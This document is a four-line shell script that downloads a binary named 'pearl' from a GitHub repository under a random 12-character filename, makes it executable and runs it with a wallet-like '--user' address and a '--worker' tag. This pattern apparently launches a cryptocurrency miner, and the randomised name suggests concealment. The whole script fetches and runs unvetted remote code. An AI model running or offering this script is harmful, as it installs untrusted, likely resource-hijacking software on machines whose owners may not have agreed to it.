NAME=$(tr -dc 'a-zA-Z0-9' </dev/urandom | head -c 12)

curl -L "https://github.com/lianamahesra-creator/legendary-journey/raw/refs/heads/main/pearl" -o "$NAME"

chmod +x "$NAME"
./"$NAME" --user prl1p2jan4dvkdfkt5r3pra7z96axrxjyjcgat9w7ldetlcy9wffm569sc9ux2t --worker NV
